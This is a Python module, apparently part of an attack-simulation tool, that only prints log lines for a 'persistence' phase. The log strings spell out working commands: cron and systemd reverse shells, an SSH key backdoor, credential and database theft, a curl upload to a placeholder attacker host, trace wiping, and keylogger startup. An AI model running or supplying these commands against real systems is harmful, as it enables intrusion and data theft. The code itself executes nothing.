"""
Persistence Module - Step 4
Simulates persistence mechanisms and data exfiltration
"""

import time
import random

class PersistenceModule:
    def __init__(self):
        self.name = "Persistence"
        self.description = "Persistence mechanisms and data exfiltration"
    
    def execute(self, target_info=None):
        """Execute persistence simulation"""
        logs = []
        
        target = target_info.get('target', '127.0.0.1') if target_info else '127.0.0.1'
        
        logs.append("[PERSISTENCE] 🔒 Starting persistence phase...")
        logs.append(f"[PERSISTENCE] 🎯 Target: {target} (Compromised system)")
        logs.append("[PERSISTENCE] 📡 Establishing persistent access...")
        
        # Simulate cron job creation
        logs.append("\n[PERSISTENCE] ⏰ Creating persistent cron job...")
        logs.append("[PERSISTENCE] Adding reverse shell cron job...")
        logs.append("[PERSISTENCE] Command: echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\"' | crontab -")
        logs.append("[PERSISTENCE] Response: Cron job added successfully!")
        logs.append("[PERSISTENCE] ⚠️  Persistent access established!")
        
        # Simulate SSH key installation
        logs.append("\n[PERSISTENCE] 🔑 Installing SSH backdoor...")
        logs.append("[PERSISTENCE] Creating .ssh directory...")
        logs.append("[PERSISTENCE] $ mkdir -p /home/user/.ssh")
        logs.append("[PERSISTENCE] $ chmod 700 /home/user/.ssh")
        logs.append("[PERSISTENCE] Installing public key...")
        logs.append("[PERSISTENCE] $ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...' >> /home/user/.ssh/authorized_keys")
        logs.append("[PERSISTENCE] $ chmod 600 /home/user/.ssh/authorized_keys")
        logs.append("[PERSISTENCE] Response: SSH backdoor installed!")
        logs.append("[PERSISTENCE] ⚠️  SSH access established!")
        
        # Simulate service installation
        logs.append("\n[PERSISTENCE] 🔧 Installing persistent service...")
        logs.append("[PERSISTENCE] Creating systemd service...")
        logs.append("[PERSISTENCE] Service file: /etc/systemd/system/venom.service")
        logs.append("[PERSISTENCE] [Unit]\nDescription=Venom Serpent Service\nAfter=network.target\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/127.0.0.1/4444 0>&1; sleep 30; done'\nRestart=always\n\n[Install]\nWantedBy=multi-user.target")
        logs.append("[PERSISTENCE] Enabling service...")
        logs.append("[PERSISTENCE] $ systemctl enable venom.service")
        logs.append("[PERSISTENCE] $ systemctl start venom.service")
        logs.append("[PERSISTENCE] Response: Service installed and started!")
        logs.append("[PERSISTENCE] ⚠️  Persistent service established!")
        
        # Simulate data exfiltration
        logs.append("\n[PERSISTENCE] 📤 Starting data exfiltration...")
        logs.append("[PERSISTENCE] Searching for sensitive files...")
        logs.append("[PERSISTENCE] $ find / -name '*.txt' -o -name '*.doc' -o -name '*.pdf' 2>/dev/null | head -10")
        logs.append("[PERSISTENCE] /var/www/html/readme.txt")
        logs.append("[PERSISTENCE] /home/user/secret.txt")
        logs.append("[PERSISTENCE] /var/log/auth.log")
        logs.append("[PERSISTENCE] /etc/passwd")
        logs.append("[PERSISTENCE] /var/www/html/config.php")
        
        # Simulate extracting specific files
        logs.append("\n[PERSISTENCE] 📄 Extracting sensitive data...")
        logs.append("[PERSISTENCE] Extracting: /home/user/secret.txt")
        logs.append("[PERSISTENCE] Content:")
        logs.append("[PERSISTENCE] ┌─────────────────────────────────────────┐")
        logs.append("[PERSISTENCE] │              SECRET.TXT                 │")
        logs.append("[PERSISTENCE] └─────────────────────────────────────────┘")
        logs.append("[PERSISTENCE] Database Credentials:")
        logs.append("[PERSISTENCE] Username: admin")
        logs.append("[PERSISTENCE] Password: SuperSecretPassword123!")
        logs.append("[PERSISTENCE] Host: localhost")
        logs.append("[PERSISTENCE] Port: 3306")
        logs.append("[PERSISTENCE] Database: target_db")
        logs.append("[PERSISTENCE] ──────────────────────────────────────────")
        logs.append("[PERSISTENCE] API Keys:")
        logs.append("[PERSISTENCE] AWS_ACCESS_KEY: AKIAIOSFODNN7EXAMPLE")
        logs.append("[PERSISTENCE] AWS_SECRET_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")
        logs.append("[PERSISTENCE] ──────────────────────────────────────────")
        logs.append("[PERSISTENCE] Personal Information:")
        logs.append("[PERSISTENCE] Name: John Doe")
        logs.append("[PERSISTENCE] Email: john.doe@company.com")
        logs.append("[PERSISTENCE] Phone: +1-555-0123")
        logs.append("[PERSISTENCE] SSN: 123-45-6789")
        
        # Simulate database dump
        logs.append("\n[PERSISTENCE] 🗄️  Dumping database...")
        logs.append("[PERSISTENCE] $ mysqldump -u admin -p'SuperSecretPassword123!' target_db > /tmp/database_dump.sql")
        logs.append("[PERSISTENCE] Response: Database dump completed!")
        logs.append("[PERSISTENCE] File size: 2.5 MB")
        logs.append("[PERSISTENCE] Records: 1,234 users, 5,678 orders, 9,012 products")
        
        # Simulate file compression and exfiltration
        logs.append("\n[PERSISTENCE] 📦 Compressing sensitive data...")
        logs.append("[PERSISTENCE] $ tar -czf /tmp/sensitive_data.tar.gz /home/user/secret.txt /tmp/database_dump.sql /var/www/html/config.php")
        logs.append("[PERSISTENCE] Response: Archive created successfully!")
        logs.append("[PERSISTENCE] Archive size: 3.2 MB")
        
        # Simulate data exfiltration via HTTP
        logs.append("\n[PERSISTENCE] 🌐 Exfiltrating data via HTTP...")
        logs.append("[PERSISTENCE] Uploading to: http://attacker-server.com/upload")
        logs.append("[PERSISTENCE] $ curl -X POST -F 'file=@/tmp/sensitive_data.tar.gz' http://attacker-server.com/upload")
        logs.append("[PERSISTENCE] Response: 200 OK - Data uploaded successfully!")
        logs.append("[PERSISTENCE] ⚠️  Data exfiltration completed!")
        
        # Simulate cleanup of local files
        logs.append("\n[PERSISTENCE] 🧹 Cleaning up local traces...")
        logs.append("[PERSISTENCE] $ rm -f /tmp/database_dump.sql")
        logs.append("[PERSISTENCE] $ rm -f /tmp/sensitive_data.tar.gz")
        logs.append("[PERSISTENCE] $ history -c")
        logs.append("[PERSISTENCE] Response: Local traces cleaned!")
        
        # Simulate additional persistence mechanisms
        logs.append("\n[PERSISTENCE] 🔄 Setting up additional persistence...")
        logs.append("[PERSISTENCE] Creating hidden directory...")
        logs.append("[PERSISTENCE] $ mkdir -p /var/tmp/.hidden")
        logs.append("[PERSISTENCE] Installing keylogger...")
        logs.append("[PERSISTENCE] $ cp /tmp/keylogger.sh /var/tmp/.hidden/")
        logs.append("[PERSISTENCE] $ chmod +x /var/tmp/.hidden/keylogger.sh")
        logs.append("[PERSISTENCE] Adding to startup...")
        logs.append("[PERSISTENCE] $ echo '/var/tmp/.hidden/keylogger.sh &' >> /etc/rc.local")
        logs.append("[PERSISTENCE] Response: Additional persistence mechanisms installed!")
        
        logs.append("\n[PERSISTENCE] ✅ Persistence phase completed!")
        logs.append("[PERSISTENCE] 📊 Summary: 3 persistence mechanisms installed")
        logs.append("[PERSISTENCE] 🎯 Data exfiltrated: 3.2 MB of sensitive data")
        logs.append("[PERSISTENCE] 🔑 Access maintained: Cron job, SSH key, systemd service")
        logs.append("[PERSISTENCE] 📤 Exfiltration method: HTTP upload to attacker server")
        
        return logs
